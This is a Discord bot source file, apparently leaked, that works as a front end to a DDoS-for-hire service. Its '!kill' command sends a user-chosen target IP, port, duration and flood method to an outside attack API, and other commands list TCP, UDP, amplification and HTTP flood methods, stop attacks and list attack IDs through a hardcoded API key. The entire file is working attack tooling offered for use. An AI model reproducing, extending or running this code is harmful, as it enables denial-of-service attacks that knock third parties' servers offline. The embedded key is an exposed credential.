const express = require('express');

const app = express();

app.get('/', (req, res) => {
  res.send('Hello Express app!')
});

app.listen(3000, () => {
  console.log('Leaked By : @mich0a');
});

const { Client, Intents } = require('discord.js');
const { MessageEmbed } = require('discord.js');  

const intents = new Intents([
    Intents.FLAGS.GUILDS,
    Intents.FLAGS.GUILD_MESSAGES,
    Intents.FLAGS.DIRECT_MESSAGES,
    Intents.FLAGS.GUILD_MESSAGE_REACTIONS
]);

const bot = new Client({ intents });

bot.once('ready', () => {
    console.log('Bot is ready.');
});

const whitelistedIds = ['', '', '', ''];
const blacklistedIps = [
    { ip: "1.1.1.1", port: 80},
];

function channelCheck(channel) {
    return channel.id === '1140987090843213826';
}

bot.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (message.content.startsWith('!kill')) {
        if (!channelCheck(message.channel)) {
            const embed = new MessageEmbed()
                .setTitle("Command Restricted")
                .setDescription("This command can only be used in <#1139985684514484345> channel.")
                .setThumbnail(message.author.avatarURL({dynamic: true}))
                .setFooter(`Requested by ${message.author.tag}`, message.author.displayAvatarURL({ dynamic: true }))
                .setColor('#FF0000');
            if (message.channel.type === 'DM') {
                await message.author.send({ embeds: [embed] });
            } else {
                await message.reply({ embeds: [embed] });
            }
            return;
        }

        const args = message.content.slice('!kill'.length).trim().split(/ +/);
        const input1 = args[0];
        const input2 = parseInt(args[1]);
        const input3 = parseInt(args[2]);
        const input4 = args[3];

        const targetIp = input1;
        const targetPort = input2;

        if (blacklistedIps.some(ip => ip.ip === targetIp && ip.port === targetPort)) {
            const embed = new MessageEmbed()
                .setTitle("Blacklisted IP")
                .setDescription("The target IP address and port combination is blacklisted and cannot be attacked.")
              .setThumbnail(message.author.avatarURL({dynamic: true}))
            .setColor('#2F3136')

            await message.reply({ embeds: [embed] });
            return;
        }

        const apiURL = `https://gloryrp.fun/api_key=&host=${input1}&port=${input2}&time=${input3}&method=${input4}`;
        const headers = {
            'User-Agent': 'Mozila/5.0 (Gloryrp.fun)',
        };

        try {
            const response = await fetch(apiURL, { headers });
            const responseData = await response.json();

            if (response.ok) {
                const embed = new MessageEmbed()
                    .setTitle('Attack Sent')
                    .setDescription('root@127.0.0.1: CyberSecurity#~ sent attack')
                    .setColor('#2F3136')
                    .addField('Target:', `${input1}:${input2}`, true)
                    .addField('Duration', `${input3} seconds`, true)
                    .addField('Method', `${input4}`, true)
                    .setAuthor(message.author.username, message.author.avatarURL())
                    .setThumbnail(message.author.avatarURL({dynamic: true}))
                    .setFooter(`Requested by ${message.author.tag}`, message.author.displayAvatarURL({ dynamic: true }));
              
                await message.reply({ embeds: [embed] });
            } else {
                const embed = new MessageEmbed()
                    .setTitle('Error')
                    .setDescription(`error code: ${response.status} - error reason: ${responseData}`)
                   .setColor('#2F3136');

                await message.reply({ embeds: [embed] });
            }
        } catch (error) {
            const embed = new MessageEmbed()
                .setTitle('Error')
                .setDescription(`Error OO9S93Z: ${error}`)
                .setColor('#2F3136');

            await message.reply({ embeds: [embed] });
        }
    }
});

bot.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (message.content === '!methods') {
        const methodsList = [
            "TCP-ACK - L4",
            "TCP-NFO - L4",
            "TCP-TFO - L4",
            "TCP-OVHv3 - L4",
            "TCP-BYPASS - L4",
            "TCP-SYN - L4",
            "UDP-RAW - L4",
            "UDP-RAKNET - L4",
            "AMP-STUN - L4",
            "-----------------",
            "HTTP-SOCKET - L7",
            "HTTP-CRANK - L7",
            "HTTP-FLAG - L7",
            "HTTP-BROWSER - L7",
            "HTTP-PLUG - L7",
            "HTTP-BYPASS - L7",
        ];

        const methodsFormatted = methodsList.map(method => `\`${method}\``).join('\n');

        const embed = new MessageEmbed()
            .setTitle("CyberSecurity#~ ls")
            .setDescription("root@127.0.0.1: CyberSecurity#~ showing all methods available")
            .setColor('#2F3136')
            .addField("Methods", methodsFormatted, false);

        await message.reply({ embeds: [embed] });
    }
});

bot.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (message.content.startsWith('!stop')) {
        const args = message.content.slice('!stop'.length).trim().split(/ +/);
        const input1 = args[0];

        if (!whitelistedIds.includes(message.author.id)) {
            const embed = new MessageEmbed()
                .setTitle("Permission Denied")
                .setDescription("You don't have permission to run this command.")
                .setColor('#FF0000');

            await message.reply({ embeds: [embed], ephemeral: true });
            return;
        }

        const apiURL = `https://gloryrp.fun/stop?api_key=`;
        const headers = {
            'User-Agent': 'Mozila/5.0 (Gloryrp.fun)',
        };

        try {
            const response = await fetch(apiURL, { headers });

            if (response.ok) {
                const embed = new MessageEmbed()
                    .setTitle('Stopped Attack')
                    .setDescription('root@127.0.0.1: CyberSecurity#~ attack off')
                    .setColor('#2F3136')
                    .addField('Attack ID', input1)
                    .setAuthor(message.author.username, message.author.avatarURL())
                    .setTimestamp()
                    .setFooter(`Requested by ${message.author.tag}`, message.author.displayAvatarURL());

                await message.reply({ embeds: [embed] });
            } else {
                const errorText = await response.text();
                const embed = new MessageEmbed()
                    .setTitle('Error')
                    .setDescription(`error code: ${response.status} - error reason: ${errorText}`)
                    .setColor('#FF0000');

                await message.reply({ embeds: [embed] });
            }
        } catch (error) {
            const embed = new MessageEmbed()
                .setTitle('Error')
                .setDescription(`Error OO9S93Z: ${error}`)
                .setColor('#FF0000');

            await message.reply({ embeds: [embed] });
        }
    }
});

bot.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (message.content === '!ids') {
        if (!whitelistedIds.includes(message.author.id)) {
            const embed = new MessageEmbed()
                .setTitle("Permission Denied")
                .setDescription("You don't have permission to run this command.")
                .setColor('#FF0000');

            await message.reply({ embeds: [embed], ephemeral: true });
            return;
        }
        const apiURL = 'https://gloryrp.fun/ids?api_key=cRU6-1ktRA-coIO-r13pE&id=';
        const headers = {
            'User-Agent': 'Mozila/5.0 (gloryrp.fun)',
        };

        try {
            const response = await fetch(apiURL, { headers });
            const responseData = await response.text(); 

            if (response.ok) {
                const embed = new MessageEmbed()
                    .setTitle('All Attack IDs')
                    .setDescription('root@127.0.0.1: CyberSecurity#~ listing all attacks')
                    .setColor('#2F3136')
                    .addField('Attacks', responseData || 'No attack IDs available') 
                    .setAuthor(message.author.username, message.author.avatarURL())
                    .setTimestamp()
                    .setFooter(`Requested by ${message.author.tag}`, message.author.displayAvatarURL());

                await message.reply({ embeds: [embed] });
            } else {
                const embed = new MessageEmbed()
                    .setTitle('Error')
                    .setDescription(`error code: ${response.status} - error reason: ${responseData}`)
                    .setColor('#FF0000');

                await message.reply({ embeds: [embed] });
            }
        } catch (error) {
            const embed = new MessageEmbed()
                .setTitle('Error')
                .setDescription(`Error OO9S93Z: ${error}`)
                .setColor('#FF0000');

            await message.reply({ embeds: [embed] });
        }
    }
});

bot.login('')